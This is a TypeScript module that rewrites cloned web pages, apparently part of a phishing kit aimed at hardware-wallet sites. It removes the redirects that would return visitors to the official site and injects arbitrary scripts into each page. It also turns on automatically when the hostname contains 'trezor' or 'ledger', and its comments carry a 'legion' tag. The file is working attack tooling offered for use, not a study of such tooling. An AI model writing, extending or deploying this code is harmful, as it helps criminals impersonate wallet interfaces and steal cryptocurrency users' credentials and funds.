/**
 * Static HTML rewriter — strip redirects, inject scripts (hardware wallet clones).
 */
export type StaticHtmlRewriteOpts = {
  /** Remove window.location redirects and meta refresh tags */
  stripRedirects?: boolean
  /** Inject HTML snippet before </body> (or append if no body tag) */
  injectBeforeBody?: string
  /** Inject HTML snippet before </head> (fallback) */
  injectBeforeHead?: string
}

const META_REFRESH_RE =
  /<meta[^>]+http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi

const WINDOW_LOCATION_PATTERNS: Array<{ re: RegExp; replacement: string }> = [
  {
    re: /window\.location\s*=\s*['"][^'"]+['"]\s*;?/gi,
    replacement: '/* legion: redirect stripped */',
  },
  {
    re: /window\.location\.(?:href|replace|assign)\s*\(\s*['"][^'"]+['"]\s*\)\s*;?/gi,
    replacement: '/* legion: redirect stripped */',
  },
  {
    re: /document\.location\s*=\s*['"][^'"]+['"]\s*;?/gi,
    replacement: '/* legion: redirect stripped */',
  },
  {
    re: /top\.location\s*=\s*['"][^'"]+['"]\s*;?/gi,
    replacement: '/* legion: redirect stripped */',
  },
]

/** Strip client-side redirects that send users back to the official site. */
export function stripRedirectsFromHtml(html: string): string {
  let out = html.replace(META_REFRESH_RE, '<!-- legion: meta refresh stripped -->')
  for (const { re, replacement } of WINDOW_LOCATION_PATTERNS) {
    out = out.replace(re, replacement)
  }
  return out
}

export function injectHtmlSnippet(
  html: string,
  snippet: string,
  placement: 'head' | 'body' = 'body',
): string {
  if (!snippet.trim()) return html
  if (placement === 'head' && html.includes('</head>')) {
    return html.replace('</head>', `${snippet}\n</head>`)
  }
  if (html.includes('</body>')) {
    return html.replace('</body>', `${snippet}\n</body>`)
  }
  if (html.includes('</head>')) {
    return html.replace('</head>', `${snippet}\n</head>`)
  }
  return `${html}\n${snippet}`
}

/** Full static clone HTML pipeline: optional redirect strip + injection. */
export function rewriteStaticHtml(html: string, opts: StaticHtmlRewriteOpts = {}): string {
  let out = html
  if (opts.stripRedirects !== false) {
    out = stripRedirectsFromHtml(out)
  }
  if (opts.injectBeforeBody) {
    out = injectHtmlSnippet(out, opts.injectBeforeBody, 'body')
  } else if (opts.injectBeforeHead) {
    out = injectHtmlSnippet(out, opts.injectBeforeHead, 'head')
  }
  return out
}

/** True when HTML looks like a hardware wallet web interface. */
export function isHardwareWalletHost(hostname: string): boolean {
  const h = hostname.toLowerCase()
  return (
    h.includes('trezor') ||
    h.includes('ledger') ||
    h.includes('suite.') ||
    h.includes('connect.trezor')
  )
}

export function shouldStripRedirectsForTarget(target: URL): boolean {
  if (isHardwareWalletHost(target.hostname)) return true
  const v = process.env['STATIC_STRIP_REDIRECTS']?.trim().toLowerCase()
  if (v === 'true' || v === '1' || v === 'yes') return true
  if (v === 'false' || v === '0' || v === 'no') return false
  return false
}
